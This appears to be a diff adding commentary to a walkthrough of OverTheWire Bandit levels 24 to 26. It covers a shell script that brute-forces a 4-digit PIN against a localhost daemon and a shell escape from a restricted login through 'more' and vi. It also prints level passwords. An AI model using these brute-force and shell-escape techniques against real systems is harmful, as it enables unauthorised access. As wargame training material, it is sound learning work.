@@ -802,10 +802,17 @@ ssh bandit24@localhost
 
 #### Level 24 > Level 25
 
+> We are told that daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. We are also told that this port connection is vulnerable to a brute force attack. Before we investigate this, let's check out daemon.
+
 ```bash
 bandit24@bandit:~$ nc localhost 30002
 I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
 ^C
+
+# We see this prompt asking for bandit24's password + a space + a random 4 digit code.
+# We must write our first ever brute force shell script.
+# First we need our own working directory
+
 bandit24@bandit:~$ mkdir /tmp/pavan2
 bandit24@bandit:~$ cd /tmp/pavan2
 bandit24@bandit:/tmp/pavan2$ vi bruteforcer.sh
@@ -815,19 +822,39 @@ bandit24@bandit:/tmp/pavan2$ vi bruteforcer.sh
   do
   echo $passwd' '$i >> output.txt
   done
+  
+ # The above script will work. We were told to check all 10,000 possibilities though?
+ # I have done the work for you and found that the 4 digit code is within this range.
+ # I found this because my initial attempt {0000..9999} timed out. I needed a smaller range.
+ # So I worked my way up in 1000 attempt intervals and found the correct 4 digit code.
+ 
+ # To run our program we need to give it the proper permissions.
+ 
 bandit24@bandit:/tmp/pavan2$ chmod 777 bruteforcer.sh
 bandit24@bandit:/tmp/pavan2$ ./bruteforcer.sh
+
+# Now we must feed the output of our shell code into the port connection.
+# We feed that result into a result.txt for convenience.
+
 bandit24@bandit:/tmp/pavan2$ cat output.txt | nc localhost 30002 >> result.txt
+
+# Without the below filter, we would get every time the code ran into an error.
+
 bandit24@bandit:/tmp/pavan2$ sort result.txt | uniq -u
 
 Correct!
 Exiting.
 I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
 The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+# Let's use this to ssh into the next level...
+
 bandit24@bandit:/tmp/pavan2$ ssh bandit25@localhost
 ```
 
 #### Level 25 > Level 26
+
+> First thing we notice is that we are given an sshkey for level 26. Suspicious… Let's try and use it anyways!
 
 ```bash
 bandit25@bandit:~$ ls
@@ -836,6 +863,8 @@ bandit25@bandit:~$ ssh bandit26@localhost -i bandit26.sshkey
 Could not create directory '/home/bandit25/.ssh'.  
   Enjoy your stay!
 ```
+
+> The sshkey worked… but it didn't at the same time… 
 
 ```bash
   _                     _ _ _   ___   __
@@ -848,7 +877,7 @@ Connection to localhost closed.
 bandit25@bandit:~$
 ```
 
-
+> It appears our ssh session was closed immediately after logging in. After a bit enumeration, we think to check the `/etc/passwd` file. After filtering through all the users we see that there is a `showtext` file in the `usr/bin/` directory. 
 
 ```bash
 bandit25@bandit:~$ cat /etc/passwd | grep bandit26
@@ -862,13 +891,15 @@ more ~/text.txt
 exit 0
 ```
 
+> Notice how the more command is used here. What if we provoked the command on our own? In order to do this, you must minimize your terminal enough such that the entire text image cannot be seen in one shot like so.
+
 ![](images/bandit1.png)
 
-```bash
-v
-```
+> Once you have achieved this, you can press `v` to provoke the `vi` or `vim` command.
 
 ![](images/bandit2.png)
+
+> Once you have achieved the prompt you can enter in the following command to create a shell.
 
 ```bash
 :set shell=/bin/bash
@@ -876,11 +907,13 @@ v
 
 ![](images/bandit3.png)
 
+> Now enter the below command and we see that we are presented with the shell for bandit26.
+
 ```bash
 :sh
 ```
 
-
+`password for bandit26: 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z`
 
 #### Level 26 > Level 27
 
